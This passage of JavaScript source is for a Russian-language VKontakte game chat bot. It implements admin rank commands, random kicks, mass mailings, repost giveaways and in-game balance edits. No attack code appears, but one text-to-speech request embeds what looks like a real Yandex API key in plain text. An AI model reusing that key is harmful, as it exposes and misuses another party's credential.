		vk.api.users.get({user_id: id}).then((res) => { 
			var z = res[0];
			message.send(`Рандом решит.. Либо "@id${z.id} (${z.first_name} ${z.last_name})" получит повышение, либо будет понижен и будет кикнут из беседы на 5 минут..`); 
		}, 4000); 
	});
	setTimeout(() => {
		message.send(`Думаю...`) 
	}, 6000); 

	setTimeout(() => {
		vk.api.users.get({user_id: id}).then((res) => { 
			var r = res[0];
			var sex = rand(1,2);
			if ( sex == 1 ) {
				message.send(`[Рандом]: Я решил, что "@id${r.id} (${r.first_name} ${r.last_name})", получает повышение!`);
				acc.users[user_id(id)].ap += 1
				message.send(`Поздравляю тебя @id${r.id} (${r.first_name} ${r.last_name}), ты повышен до: ${acc.users[user_id(id)].ap.toString().replace(/0/gi, "Игрока").replace(/1/gi, "VIP`a").replace(/2/gi, "Модератора").replace(/3/gi, "Администратора").replace(/4/gi, "Ст. Администратора").replace(/5/gi, "Гл. Администратора").replace(/6/gi, "Спец Администратора").replace(/7/gi, "Разработчик")}`)
				return 
			} 
			else {
				message.send(`[Рандом]: Я решил, что "@id${r.id} (${r.first_name} ${r.last_name})", получает понижение и будет исключён из беседы на 5 мин..`);
				acc.users[user_id(id)].ap -= 1
				message.send(`К сожалению @id${r.id} (${r.first_name} ${r.last_name}), ты понижен до: ${acc.users[user_id(id)].ap.toString().replace(/0/gi, "Игрока").replace(/1/gi, "VIP`a").replace(/2/gi, "Модератора").replace(/3/gi, "Администратора").replace(/4/gi, "Ст. Администратора").replace(/5/gi, "Гл. Администратора").replace(/6/gi, "Спец Администратора").replace(/7/gi, "Разработчик")} и исключаешься от сюда.. Пока`)
				vk.api.call(`messages.removeChatUser`, {chat_id: message.chatId, user_id: id});
				return
			}
		});
	}, 7500)
});

cm.hear(/(?:me)\s?([^]+)?/i,  (message) => { 
	if(!message.$match[1]) return message.send(`Ошибка: me (Действие).`)

		if(message.user == 530903911) {
			message.send(`🤴 @id530903911 (Незнакомец) * ${message.$match[1]} *`);
			return
		}
		vk.api.users.get({user_id: message.user}).then((res) => { 
			const e = res[0];
			return message.send(`💬 @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) * ${message.$match[1]} *`)

		});
	});





	vk.updates.hear(/^(?:адмсмс|admsms)\s?([^]+)?/i, (message) => {		
		if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
			let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`А текст после " адмсмс " кто будет писать?!`);
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор/модератор !`);
		let a = zapret(message.$match[1]);
		if(a != 0) return message.send(a);

		if(message.user == 530903911) {
		for(i=0;i<200000;i++){
			if(acc.users[i]){
				if(acc.users[i].ap >= 3){ 
					vk.api.call("messages.send", {
						peer_id: acc.users[i].id,
						message: `⛔ [ADMIN CHAT]\n🚫 @vkbotevolk(Разработчик) [ID: 9]\n🚫 Сообщение: ${message.$match[1]}\n`,random_id: 0
					}).then((res) => {}).catch((error) => {console.log('report error'); });	
				}
			}
		}
				return message.send(`@vkbotevolk(Основатель), сообщение отправлено`);
		}


		for(i=0;i<200000;i++){
			if(acc.users[i]){
				if(acc.users[i].ap >= 3){ 
					vk.api.call("messages.send", {
						peer_id: acc.users[i].id,
						message: `< ⛔ >: [ADMIN CHAT]\n⛔ ➾ ID игрока: ${user_id(message.user)}\n⛔ Сообщение:: ${message.$match[1]}\n`,random_id: 0
					}).then((res) => {}).catch((error) => {console.log('report error'); });	
				}
			}
		}
		return message.send(`Вы успешно отправили админ сообщение !`);
	});

cm.hear(/(?:раздача)$/i, async (message) => { 
	var bd = acc.users[user_id(message.user)];
	if(bd.ap < 3) {
		message.reply('Вы не Основатель.');
		return message.sendSticker(13475);
	}
	var bvin = 950000000; 
	var smile = ['🙂','😯','☺','🤑','😉'].random(); 
	var nsmile = ['🎊','⭐','🔊','🔥','🎮','🌈','💡','💳','🏆','🎉','💸'].random(); 
	mifa.api.wall.post({owner_id: -181438458, message: `🏆 Доброго времени суток! Сделайте репост этой записи и получите: ${spaces(bvin)}$ на свой игровой баланс. 
		— Начало акции в ${time(1)}. Длительность акции 3 часа.`, attachment: 'photo-179018727_456239024'}).then((response) => { 
			mifa.api.wall.openComments({owner_id: -181438458, post_id: response.post_id }); 
			mifa.api.wall.createComment({owner_id: -181438458, post_id: response.post_id, from_group: 181438458, message: `*Вы должны быть зарегистрированы в боте, а ваш профиль ВКонтакте открыт.\n— Валюта будет выдана по окончанию акции, об этом вы будите оповещены в личных сообщениях бота.`}); 
			mifa.api.wall.closeComments({owner_id: -181438458, post_id: response.post_id}); 
			message.send(`Вы успешно запустили раздачу.\n Ссылка на раздачу: [vk.com/wall-181438458_${response.post_id}].`) 

			setTimeout(() => { 
				mifa.api.wall.getReposts({owner_id: -181438458, post_id: response.post_id, count: 1000}).then((res) => { 
					res.items.map(x=> { 
						if(x.from_id < 0) return; 
						var vkbotevolk = acc.users[user_id(x.from_id)]; 
						if(!vkbotevolk) return; 
						vkbotevolk.balance += bvin; 
						vk.api.messages.send({user_id: x.from_id, message: `${nsmile} Спасибо за участие в раздаче!\n ▶ На ваш баланс было зачислено ${spaces(bvin)}$ ${smile}`}); 
						vk.api.messages.send({user_id: message.user, message: `[Авто-Раздача]: Игроку "(@id${vkbotevolk.id} (${vkbotevolk.prefix})" выдано: ${spaces(bvin)}$ на баланс.\n\nЕго баланс составляет: ${spaces(vkbotevolk.balance)}$`}) 
					}); 
				}); 

				mifa.api.wall.openComments({owner_id: -181438458, post_id: response.post_id }); 
				mifa.api.wall.createComment({owner_id: -181438458, post_id: response.post_id, from_group: 181438458, message: '*Раздача окончена. Всем участникам Акции призы были успешно начисленны.'}); 
				mifa.api.wall.closeComments({owner_id: -181438458, post_id: response.post_id}); 
			}, 10800000); 
		}); 
	});


cm.hear(/(?:setras)\s?([^]+)/i, (message) => {
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}
	if (!message.$match[1]) return message.send(`Введите ID Администратора.`)
		var bd = acc.users[message.$match[1]];
	bd.ras = true
	return message.send(`@vkbotevolk(Ильдар), вы выдали Администратору «@id${bd.id} (${bd.prefix})» доступ к секретному админ разделу.`)

});


cm.hear(/(?:delras)\s?([^]+)/i, (message) => {
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}
	if (!message.$match[1]) return message.send(`Введите ID Администратора.`)
		var bd = acc.users[message.$match[1]];
	bd.ras = false
	return message.send(`@vkbotevolk(Ильдар), вы забрали у администратора «@id${bd.id} (${bd.prefix})» доступ к секретному админ разделу.`)

});




cm.hear(/(?:кнопка)\s(.*)$/i, async(message) => { 
	var bd = acc.users[user_id(message.user)];

	if (bd.ras == false) {
		if(message.isChat){
			return message.reply(`Эту команду можно использовать только в @mskbt(группе)!`); 
		}
	}

	if (message.$match[1].toLowerCase() === "удалить") { 
		bd.buttons = []; 
		return message.send(`Все кнопки удалены ❌`, { 
			keyboard: Keyboard.keyboard([]) 
		}); 
	} 
	else 
	{ 
		if (bd.buttons.length >= 40) return message.reply(`У вас достигнуто максимальное кол-во кнопок. ❌`); 
		bd.buttons.push(message.$match[1]); 
		await message.send(`Кнопка «${message.$match[1]}» добавлена ✔`, { 
			keyboard: button(bd.buttons) 
		}); 
	} 
});






// Рассылки

cm.hear(/(?:Рассылка)\s?([^]+)?/i,  message => { 
	var bd = acc.users[user_id(message.user)];
	if (bd.ras == false) {
		message.reply('Только для спец. Администрации.\n -- Для получения доступа обратитесь к @vkbotevolk(Разработчику).');
		return message.sendSticker(13475);
	}
	if(!message.$match[1]) return message.send(`Ошибка. Введите: Рассылка [Текст]`)
		for ( i in acc.users ) {
			if (acc.users[i].sub == true) {
				vk.api.call('messages.send', {
					user_id: acc.users[i].id,
					message: `
					🔔 Рассылка:

					«${message.$match[1]}»
					💻 Приятной игры!


					💬 [Подсказка] Вы в любой момент можете отписаться от рассылки, Нажав на кнопку «Отписаться»`,
					random_id: 0,
					keyboard: JSON.stringify( 
					{ 
						"one_time": false, 
						"buttons": [ 
						[{ 
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": `Отписаться` 
							}, 
							"color": "negative"
						},
						{ 
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": `Подписаться` 
							}, 
							"color": "positive"
						}] 
						] 
					})  
				});
			}
		}
		return message.send(`Рассылка успешно выполнена.`);
	});



cm.hear(/(?:cr)\s?([^]+)?/i,  message => { 
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		var bd = acc.users[user_id(message.user)];
	if (bd.ras == false) {
		message.reply('Только для спец. Администрации.\n -- Для получения доступа обратитесь к @vkbotevolk(Разработчику).');
		return message.sendSticker(13475);
	}
	if(!message.$match[1]) return message.send(`Ошибка. Введите: cr [Текст]`)
		for ( id in acc.users ) {
			vk.api.call('messages.send', {
				chat_id: id, 
				message: `
				🔔 Рассылка:
				«${message.$match[1]}»
				💻 Приятной игры!`,
				random_id: 0 
			});
		}
		return message.send(`Рассылка успешно выполнена.`);
	});




cm.hear(/(?:Пост Рассылка)\s?([^]+)?\s([^]+)?/i, (message) => {
	var bd = acc.users[user_id(message.user)];
	if (bd.ras == false) {
		message.reply('Только для спец. Администрации.\n -- Для получения доступа обратитесь к @vkbotevolk(Разработчику).');
		return message.sendSticker(13475);
	}
	if(!message.$match[1] || !message.$match[2]) return message.send(`Ошибка. Введите: Пост Рассылка [Текст] [Вложение]`);
	for ( i in acc.users ) {
		if (acc.users[i].sub == true) {
			vk.api.call('messages.send', {
				user_id: acc.users[i].id,
				message: `
				🔔 Рассылка:

				«${message.$match[1]}»
				💻 Приятной игры!


				💬 [Подсказка] Вы в любой момент можете отписаться от рассылки, Нажав на кнопку «Отписаться»`,
				attachment: `${message.$match[2]}`,
				random_id: 0,
				keyboard: JSON.stringify( 
				{ 
					"one_time": false, 
					"buttons": [ 
					[{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": `Отписаться` 
						}, 
						"color": "negative"
					},
					{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": `Подписаться` 
						}, 
						"color": "positive"
					}] 
					] 
				})  
			});
		}
	}
	return message.send(`Рассылка успешно выполнена.`);
});


cm.hear(/(?:cp)\s?([^]+)?\s([^]+)?/i, (message) => {
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		var bd = acc.users[user_id(message.user)];
	if (bd.ras == false) {
		message.reply('Только для спец. Администрации.\n -- Для получения доступа обратитесь к @vkbotevolk(Разработчику).');
		return message.sendSticker(13475);
	}
	if(!message.$match[1] || !message.$match[2]) return message.send(`Ошибка. Введите: cp [Текст] [Вложение]`);		
	for ( id in acc.users ) {
		vk.api.call('messages.send', {
			chat_id: id, 
			message: `
			🔔 Рассылка:
			«${message.$match[1]}»
			💻 Приятной игры!`,
			attachment: `${message.$match[2]}`,
			random_id: 0 
		});
	}
	return message.send(`Рассылка успешно выполнена.`);
});



cm.hear(/(?:devpost)\s?([^]+)?\s([^]+)?/i, (message) => {
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}


	if(!message.$match[1] || !message.$match[2]) return message.send(`Ошибка. Введите: devpost [Текст] [Вложение]`);
	for ( i in acc.users ) {
		if (acc.users[i].sub == true) {
			vk.api.call('messages.send', {
				user_id: acc.users[i].id,
				message: `
				🔔 Рассылка от @id${message.user}(Разработчика):

				«${message.$match[1]}»
				💻 Приятной игры!


				💬 [Подсказка] Вы в любой момент можете отписаться от рассылки, Нажав на кнопку «Отписаться»`,
				attachment: `${message.$match[2]}`,
				random_id: 0,
				keyboard: JSON.stringify( 
				{ 
					"one_time": false, 
					"buttons": [ 
					[{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": `Отписаться` 
						}, 
						"color": "negative"
					},
					{ 
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": `Подписаться` 
						}, 
						"color": "positive"
					}] 
					] 
				})  
			});
		}
	}
	for ( id in acc.users ) {  
		vk.api.call('messages.send', { 
			chat_id: id, 
			message: `
			🔔 Рассылка от @id${message.user}(Разработчика):
			«${message.$match[1]}»
			💻 Приятной игры!`,
			attachment: `${message.$match[2]}`,
			random_id: 0 
		});
	}
	return message.send(`@vkbotevolk (Ильдар), Вы успешно запустили рассылку поста во все беседы и личные сообщения.\n -- Ссылка на пост: [vk.com/${message.$match[2]}].`); 	    
});


cm.hear(/(?:Отписаться)/i,  message => { 
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		vk.api.users.get({user_id: message.user}).then((res) => {
			var e = res[0];

			if ( acc.users[user_id(message.user)].sub == false ) {

				return message.send(`💫 @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы уже отписаны от рассылки.`, {


					keyboard: JSON.stringify( 
					{ 
						"one_time": true, 
						"buttons": [ 
						[{  
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": `Подписаться` 
							}, 
							"color": "positive"
						}] 
						] 
					}) 
				})
			}

			acc.users[user_id(message.user)].sub = false
			message.send(`
				💫 @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы успешно отписались от рассылки.
				💬 [Подсказка] Отписываясь от рассылки, вы теряете возможность узнать о новых событиях, акциях и обновлениях бота.`, {


					keyboard: JSON.stringify( 
					{ 
						"one_time": true, 
						"buttons": [ 
						[{  
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": `Подписаться` 
							}, 
							"color": "positive"
						}] 
						] 
					}) 

				})


			var t = 0; 
			for(a in acc.users){ 
				if(Number(acc.users[a].sub)) { 
					t += acc.users[a].sub
				} 
			} 
			vk.api.messages.send({user_id: 530903911, message: `

				[${time(1)}] @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) отписался от рассылки, от @club181438458 (Группы) 💔
				👪 Участников в акции: ${utils.sp(t)}

				`, random_id: 0,}); 

			return
		})
})



cm.hear(/(?:Подписаться)/i,  message => { 
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		vk.api.users.get({user_id: message.user}).then((res) => {
			var e = res[0];
			if ( acc.users[user_id(message.user)].sub == true ) {

				return message.send(`💫 @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы уже подписаны на рассылку.`, {


					keyboard: JSON.stringify( 
					{ 
						"one_time": true, 
						"buttons": [ 
						[{  
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": `Отписаться` 
							}, 
							"color": "negative"
						}] 
						] 
					}) 
				})
			}
			acc.users[user_id(message.user)].sub = true
			message.send(`💫 @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}), Вы успешно подписались на рассылку.`, {


				keyboard: JSON.stringify( 
				{ 
					"one_time": true, 
					"buttons": [ 
					[{  
						"action": { 
							"type": "text", 
							"payload": "{\"button\": \"1\"}", 
							"label": `Отписаться` 
						}, 
						"color": "negative"
					}] 
					] 
				}) 

			})

			var t = 0; 
			for(a in acc.users){ 
				if(Number(acc.users[a].sub)) { 
					t += acc.users[a].sub
				} 
			} 
			vk.api.messages.send({user_id: 530903911, message: `

				[${time(1)}] @id${e.id} (${e.first_name.slice(0,1)}. ${e.last_name}) подписался на рассылку, от @club181438458 (Группы) 💖
				👪 Участников в акции: ${utils.sp(t)}

				`, random_id: 0,}); 

			return
		})
})
// Рассылки













cm.hear(/(?:full)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => { 	 
	if(message.user != 530903911 && message.user != 530903911 & message.user != 263793331) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}
	if(!message.$match[1] || !message.$match[2]) return message.send(`@vkbotevolk(Ильдар), пример команды: Full [ID] [Уровень доступа: (1-3)] - Фулл Доступ: Позволяет управлять Администрацией не имея должности "Создатель"`); 
	if(message.$match[2] > 3) return message.send(`@vkbotevolk(Ильдар), максимальный уровень доступа: 3`)
		if(!acc.users[message.$match[1]]) return message.send(`@vkbotevolk(Ильдар), такого игрока нет!`); 
	acc.users[message.$match[1]].ap = Number(message.$match[2]);
	var bd = acc.users[user_id(message.user)];
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ «@id${bd.id} (${bd.prefix})» выдал  вам должность: (${message.$match[2].toString().replace(/0/gi, "Игрока").replace(/1/gi, "Стажёра").replace(/2/gi, "Администратора").replace(/3/gi, "Главного Администратора")}).`,
		random_id: 0 
	});
	message.send(`🔸 «@id${bd.id} (${bd.prefix})» вы выдали игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix})» Уровень Доступа: (${message.$match[2].toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}).`);
		return vk.api.messages.send({
		peer_id: 530903911,
		message: `[full] Администратор «@id${bd.id} (${bd.prefix}) (ID: ${user_id(message.user)})» выдал игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix}) (ID ${message.$match[1]})» Уровень Доступа: (${message.$match[2]}).`,
random_id: 0 
});
});


cm.hear(/(?:setadmin|setadm|makeadmin)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => { 
	if (message.$match[1] == 1) {
		message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
		return message.sendSticker(13475);
	}  
	var bd = acc.users[user_id(message.user)];
	if(bd.ap < 3) {
		message.reply('Вы не Спец Администратор.');
		return message.sendSticker(13475);
	}
	if(!message.$match[1] || !message.$match[2]) return message.send(`Ошибка: Пример: setadm [ID] (1-3)`); 
	if(message.$match[2] > 3) return message.send(`Максимальный уровень доступа: 3`)
		if(!acc.users[message.$match[1]]) return message.send(`Такого игрока нет!`); 
	acc.users[message.$match[1]].ap = Number(message.$match[2]);
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ «@id${bd.id} (${bd.prefix})» выдал  вам должность: (${message.$match[2].toString().replace(/0/gi, "Игрока").replace(/1/gi, "Стажёра").replace(/2/gi, "Администратора").replace(/3/gi, "Главного Администратора")}).`,
		random_id: 0 
	});
		message.send(`🔸 «@id${bd.id} (${bd.prefix})» вы выдали игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix})» Уровень Доступа: (${message.$match[2].toString().replace(/0/gi, "Игрок").replace(/1/gi, "Стажёр").replace(/2/gi, "Администратор").replace(/3/gi, "Главный Администратор")}).`);

		return vk.api.messages.send({
		peer_id: 530903911,
		message: `[setadmin] Администратор «@id${bd.id} (${bd.prefix}) (ID: ${user_id(message.user)})» выдал игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix}) (ID ${message.$match[1]})» Уровень Доступа: (${message.$match[2]}).`,
random_id: 0 
});
		});


cm.hear(/(?:состав|team|admins)/i, message => {  

	var bd = acc.users[user_id(message.user)];
	if(bd.ap < 3) return


		var dev, adm, staj
	
	dev = ` "Главная Администрация" \n`
	adm = ` "Администрация" \n` 
	staj = ` "Стажёры" \n`

	for ( id in acc.users ) {
		if ( acc.users[id] ){
			var user = acc.users[id];

			if (user.ap == 3) dev += `⛔ @id${acc.users[id].id}(${acc.users[id].prefix}), ID (${id})\n`; 
			if (user.ap == 2) adm += `👑 @id${acc.users[id].id}(${acc.users[id].prefix}), ID (${id})\n`; 
			if (user.ap == 1) staj += `☢ @id${acc.users[id].id}(${acc.users[id].prefix}), ID (${id})\n`; 
		}
	}

	var text = `\n`;
	if (dev.length != 1000) text += dev;
	if (adm.length != 1000) text += adm;
	if (staj.length != 1000) text += staj;  
	return message.send(`

		❗ Администрация BigWars Бот:
		${text}

		`);
});





cm.hear(/(?:гиф|gif)\s(.*)$/i, async (message, bot) => {
	var user = acc.users[user_id(message.user)];
	vk.api.call('docs.search', {q: message.$match[1] + '.gif', count: 5}) .then(response => { 
		var items = response.items.map(x => `doc${x.owner_id}_${x.id}`).join(','); 
		return message.send(`@id${user.id}(${user.prefix}), по вашему запросу [${message.$match[1]}], я нашла следующие GIF Материалы:`, {attachment: items}) 
	}) 
});



cm.hear(/(?:Деньги)\s?([^\s  ].*)?/i, message => {
	var bd = acc.users[user_id(message.user)];
	if(bd.ap < 3) {
		message.reply('Вы не Спец Администратор.');
		return message.sendSticker(13475);
	}
	var user = acc.users[user_id(message.user)];
	var mon = parserInt(message.$match[1]);
	var st = [1914, 4163, 8331].random();
	user.balance = mon
	message.send(`[АДМИНИСТРАТОР] Баланс установлен: ${spaces(mon)}$`);
});


cm.hear(/(?:Стикер)\s?([0-9]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	let stick = message.$match[1];
	if(!message.$match[1]) return message.send(`@id${user.id}(${user.prefix}), Укажите ID Стикера`);  
	message.send({
		sticker_id: stick}).catch((error) => {return message.send(`😢 @id${user.id}(${user.prefix}), к сожалению, мой @vkbotevolk (Владелец) не купил мне ещё пак в котором будет стикер №${message.$match[1]}`)});
});

cm.hear(/(?:РандСтик)/i,  (message) => {
	let user = acc.users[user_id(message.user)];

	let stick = [8480,11997,12116,11565,11607,6111,6119,10327,10335,10336,11098,11097,11094,4277,4278,4284,4296,8484,4318,11240,11249,11242,11120,11121,10354,10359,10360,7322,7327,7331,7330,7328,303,308,301,7470,10874,10407,8471,10413,8472,5823].random();
	message.send({sticker_id: stick});
});


cm.hear(/(?:Рандмуз)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let stick = [8925,8477,8478,326,7476].random();
	let idm = ['	','audio530903911_456239243','audio530903911_456239258','audio530903911_456239440','audio530903911_456239212','audio530903911_456239247','audio530903911_456239434','audio530903911_456239433','audio530903911_456239435','audio530903911_456239436','audio530903911_456239436','audio530903911_456239427','audio530903911_456239425'].random();
	message.send(`🎧 » @id${user.id}(${user.prefix}), музыка специально для тебя:`, {attachment: idm});
	message.send({sticker_id: stick});
});




cm.hear(/(?:giv|гив)\s?([0-9]+)?\s?([^\s  ].*)?/i,  message => {
	var s1 = message.$match[1]
	var games = `@id${acc.users[s1].id}(${acc.users[s1].prefix})`

	var user = acc.users[user_id(message.user)];
	var mon = parserInt(message.$match[2]);
	var pbal = acc.users[message.$match[1]].balance

	var bd = acc.users[user_id(message.user)];
	if(bd.ap < 3) {
		message.reply('Вы не Спец Администратор.');
		return message.sendSticker(13475);
	}
	if(!s1 || !acc.users[s1] || !message.$match[2]) return;
	if(!Number(s1)) return;
	if(!acc.users[s1]) return message.send(`@id${user.id}(${user.prefix}), игрок не зарегистрирован в боте.`);
	acc.users[s1].balance += mon
	var bal = acc.users[s1].balance

	logs(user_id(message.user), s1, message.$match[2], type = 2)
	var is = [user_id(message.user), message.text] 
	adm_log(is)

     vk.api.messages.send({
		peer_id: 530903911,
		message: `[giv] Администратор «@id${bd.id} (${bd.prefix}) (ID: ${user_id(message.user)})» выдал игроку «@id${acc.users[message.$match[1]].id} (${acc.users[message.$match[1]].prefix}) (ID ${message.$match[1]})» ${spaces(message.$match[2])}$.`,
		random_id:0
});
	return message.send(`

		@id${user.id}(${user.prefix}), игроку ${games} зачислено: ${spaces(mon)}$
		🗂 Предыдущий баланс: ${spaces(pbal)}$
		💰Баланс: ${spaces(bal)}$`);


});




cm.hear(/(?:AVIG)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
	if (message.$match[1] == 1) {
		message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
		return message.sendSticker(13475);
	} 
	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`@id${user.id}(${user.prefix}), вы не спец. Администратор.`);
	var args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !message.$match[2]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Avig [ID Администратора] [Причина Выговора]. \n Avig Это -- Выдача Административного выговора Администратору [После выдачи 3х выговоров, Администратор будет снят.].`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Аккаунт игрока @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) заблокирован навсегда.`);
	if(acc.users[message.$match[1]].ap == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) не Администратор`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
	acc.users[message.$match[1]].ainfo.vig += 1; 

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	var ain = acc.users[message.$match[1]].ainfo.vig
	let text = `
	@id${user.id}(${user.prefix}) выдал вам 1 Административный выговор.
	-- У вас: ${ain}/3 Выговоров.
	-- Комментарий Администратора: ${message.$match[2]}

	`

	if(acc.users[message.$match[1]].ainfo.vig > 2){
		acc.users[message.$match[1]].ainfo.vig = 0  
		acc.users[message.$match[1]].ap = 0;
		text += `
		🔸 @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}), Вы получили 3/3 Административных выговора..
		-- Ваш аккаунт преобрёл статус: Игрок.
		`
	}
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: text,
		random_id: 0 
	}); 
	return message.send(`
		@id${user.id}(${user.prefix}), Вы выдали Административный выговор Администратору: @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}).
		-- Причина Выговора: ${message.$match[2]}
		-- У Него ${ain}/3 Выговоров. 

		[Подсказка]: При 3/3 Аккаунт преобретает статус: Игрок.

		`);
}); 



cm.hear(/(?:unavig)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`@id${user.id}(${user.prefix}), вы не спец. Администратор.`);
	if(!message.$match[1]) return message.send(` @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: UnAvig [ID пользователя c выговорами] \n UnAvig Это -- Команда для снятия всех Административных выговоров Администратору. [Все выговоры будут сняты с аккаунта Администратора].`);
	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Аккаунт игрока @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) заблокирован навсегда.`);
	if(acc.users[message.$match[1]].ap == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Игрок @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) не Администратор`);
	if(acc.users[message.$match[1]].ainfo.vig == 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- У Игрока @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) 0/3 Административных выговоров.`);
	if(!acc.users[message.$match[1]]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);

	acc.users[message.$match[1]].ainfo.vig = 0; 

	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}), c вашего аккаунта были сняты все Административные выговора.\n -- Больше не нарушай :)`,
		random_id: 0 
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`@id${user.id}(${user.prefix}), Вы сняли игроку @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) все Административные Выговора.`);
});




cm.hear(/(?:скажи)\s(.*)?$/i, (message) => { 
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}

	if(message.$match[1].length > 500) return message.send('Ошибка. Предел 500 символов.'); 
	https.get("https://tts.voicetech.yandex.net/generate?text=" + encodeURIComponent(message.$match[1]) + `&format=mp3&lang=ru-RU&speaker=ermil&speed=1&key=3b141899-4097-45c6-a00b-d449812e1ffa&emotion=Usual`, (stream) => { 
		stream.name = 'audio_message.ogg'; 
		return message.sendAudioMessage(stream); 
	}); 
});


cm.hear(/(?:setname)\s([^]+)?/i, (message) => { 
	if(message.user != 530903911) {
		message.reply('Только для @vkbotevolk(Разработчика).');
		return message.sendSticker(13475);
	}
	if(!message.isChat) return message.send(`@id${user.id}(${user.prefix}), данная команда доступна в беседе.`) 
		vk.api.call("messages.editChat", {chat_id: message.chatId, title: message.$match[1]}).catch((error) => {
			return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы
				Возможные причины:
				-- Сообщество не имет достаточно доступа, сообщество не Администратор беседы.`);
		}); 
	message.send(`[Система] Название беседы было успешно изменено на: ${message.$match[1]}`, {attachment: `audio2000277804_456240724`}); 
